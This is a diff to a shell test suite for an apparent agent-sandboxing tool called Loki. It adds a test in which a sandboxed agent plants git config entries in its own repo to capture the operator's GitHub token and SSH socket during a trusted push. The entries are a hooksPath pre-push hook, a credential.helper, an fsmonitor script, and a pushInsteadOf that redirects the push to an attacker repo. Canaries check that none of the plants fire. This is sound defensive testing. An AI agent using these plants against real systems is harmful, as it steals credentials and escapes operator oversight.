@@ -1515,6 +1515,13 @@ PY
         # a real credential.helper reset (not GH_CONFIG_DIR/GH_TOKEN scoping)
         # closes this path; see the git-credential-moatkeychain shim above.
         printf '[credential]\n\thelper = moatkeychain\n' > "$L/home/.gitconfig"
+        # BACKLOG 149 round 5: the github.com -> local-bare rewrites live in the
+        # OPERATOR's global config. Loki's trusted push now runs from a fresh
+        # repo that never loads the agent's repo config (where the fixture's
+        # original insteadOf lives), so the model needs the operator-side
+        # rewrite, which is where a real operator's routing would be too.
+        printf '[url "%s"]\n\tinsteadOf = https://github.com/octocat/hello.git\n[url "ssh://moat-p9.invalid/repo.git"]\n\tinsteadOf = ssh://git@github.com/octocat/hello.git\n' \
+            "$T/remote.git" >> "$L/home/.gitconfig"
         cp -R "$W" "$L/work" || { nok "[$1] fixture copy failed"; return 1; }
         : > "$L/push.log"; : > "$L/gh.log"; : > "$L/provider-actions.log"; : > "$L/ssh.log"
         {
@@ -1698,7 +1705,10 @@ PY
     #     GIT_SSH_COMMAND (the fake ssh checks the agent fingerprint before it
     #     ever reaches the bare repo's hook).
     if [ -n "$SSH_FP" ]; then
-        inj_run auto-pr-ssh "export LOKI_DELEGATE_PR=0 LOKI_AUTO_PR=1; git -C '$T/auto-pr-ssh/work' remote set-url origin ssh://moat-p9.invalid/repo.git || exit 42"
+        # A real-shaped GitHub ssh origin (Loki only pushes to a validated
+        # github.com origin); the operator's global config routes it to the
+        # fixture's fake ssh.
+        inj_run auto-pr-ssh "export LOKI_DELEGATE_PR=0 LOKI_AUTO_PR=1; git -C '$T/auto-pr-ssh/work' remote set-url origin ssh://git@github.com/octocat/hello.git || exit 42"
         if inj_live auto-pr-ssh; then
             [ -z "$(inj_leaked auto-pr-ssh)" ] \
                 || nok "[auto-pr-ssh] canary token(s) reached the provider environment: $(inj_leaked auto-pr-ssh)"
@@ -1709,6 +1719,60 @@ PY
             grep -qx 'loki accepted' "$T/auto-pr-ssh/push.log" \
                 || nok "[auto-pr-ssh] Loki's own session push over the SSH origin was not accepted (push log: $(tr '\n' ',' < "$T/auto-pr-ssh/push.log"))"
         fi
+    fi
+
+    # 2c. planted (BACKLOG 149 round 5): the agent plants code in its own repo
+    #     config and waits for Loki's trusted push, which used to run `git push`
+    #     inside that repo with every credential channel restored. Plants: an
+    #     includeIf file setting core.hooksPath to a pre-push hook that also
+    #     runs `git credential fill` (repo-local credential.helper plant) and
+    #     `git status` (core.fsmonitor plant), plus url.pushInsteadOf pointing
+    #     the push at an attacker repo. Default path (on_run_complete,
+    #     LOKI_DELEGATE_PR=1). tests/test-trusted-push-agent-config.sh covers
+    #     each plant in isolation, plus .git/hooks, include.path, insteadOf and
+    #     core.sshCommand, which this fixture cannot fire (its operator sets
+    #     GIT_SSH_COMMAND, which outranks core.sshCommand).
+    local PL="$T/planted" PLOG="$T/planted/plant.log"
+    mkdir -p "$PL/hp" "$PL/home-ctl"
+    printf '#!/bin/sh\necho "$1 token=${GH_TOKEN:-none} sock=${SSH_AUTH_SOCK:-none}" >> "%s"\n' "$PLOG" > "$PL/rec.sh"
+    printf '#!/bin/sh\n%s hookspath\nprintf "protocol=https\\nhost=moat-p9.invalid\\n\\n" | git credential fill >/dev/null 2>&1\ngit status --porcelain >/dev/null 2>&1\nexit 0\n' "$PL/rec.sh" > "$PL/hp/pre-push"
+    printf '#!/bin/sh\n%s credhelper\n' "$PL/rec.sh" > "$PL/cred.sh"
+    printf '#!/bin/sh\n%s fsmonitor\nexit 1\n' "$PL/rec.sh" > "$PL/fsmon.sh"
+    printf '[core]\n\thooksPath = %s\n' "$PL/hp" > "$PL/inc.gitconfig"
+    git init -q --bare "$PL/attacker.git"
+    printf '#!/bin/sh\n%s pushinsteadof\n' "$PL/rec.sh" > "$PL/attacker.git/hooks/pre-receive"
+    chmod +x "$PL/rec.sh" "$PL/hp/pre-push" "$PL/cred.sh" "$PL/fsmon.sh" "$PL/attacker.git/hooks/pre-receive"
+    {
+        printf 'r="$1"\n'
+        printf 'git -C "$r" config "includeIf.gitdir:**/.git.path" %q\n' "$PL/inc.gitconfig"
+        printf 'git -C "$r" config credential.helper %q\n' "!$PL/cred.sh"
+        printf 'git -C "$r" config core.fsmonitor %q\n' "$PL/fsmon.sh"
+        printf 'git -C "$r" config url.%q.pushInsteadOf https://github.com/octocat/hello.git\n' "$PL/attacker.git"
+    } > "$PL/plant-repo.sh"
+    # Positive control: the OLD trusted push (credentialed `git push origin`
+    # from inside the planted repo) fires every plant with the credential.
+    # Sandboxed HOME, no system config, so no real credential helper is asked.
+    cp -R "$W" "$PL/ctl" && bash "$PL/plant-repo.sh" "$PL/ctl"
+    : > "$PLOG"
+    ( cd "$PL/ctl" && env HOME="$PL/home-ctl" GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0 \
+        GH_TOKEN="$GH_CANARY" SSH_AUTH_SOCK="${SSH_AGENT_SOCK:-/nonexistent}" \
+        git push -q origin HEAD:refs/heads/moat-planted-control ) >/dev/null 2>&1
+    local _pt
+    for _pt in hookspath credhelper fsmonitor pushinsteadof; do
+        grep -q "^$_pt token=$GH_CANARY" "$PLOG" \
+            || nok "[planted] control: the $_pt plant did not record the credential on the old in-repo push (plant not live; log: $(tr '\n' ',' < "$PLOG"))"
+    done
+    : > "$PLOG"
+    inj_run planted "bash '$PL/plant-repo.sh' '$PL/work' || exit 43"
+    if inj_live planted; then
+        grep -q "token=$GH_CANARY" "$PLOG" \
+            && nok "[planted] a plant in the agent's repo config ran holding the real GitHub token: $(grep "token=$GH_CANARY" "$PLOG" | cut -d' ' -f1 | tr '\n' ',')"
+        [ -n "${SSH_AGENT_SOCK:-}" ] && grep -qF "sock=$SSH_AGENT_SOCK" "$PLOG" \
+            && nok "[planted] a plant in the agent's repo config ran holding the real SSH agent socket"
+        grep -qx 'loki accepted' "$T/planted/push.log" \
+            || nok "[planted] Loki's own push did not reach the real remote with the credential (push log: $(tr '\n' ',' < "$T/planted/push.log"))"
+        grep -q '^loki token=yes via=[a-z]* pr create' "$T/planted/gh.log" \
+            || nok "[planted] Loki's own gh pr create did not carry the token"
     fi
 
     # 3. opt-out: LOKI_ALLOW_AGENT_GITHUB_TOKEN=1 restores the old exposure and
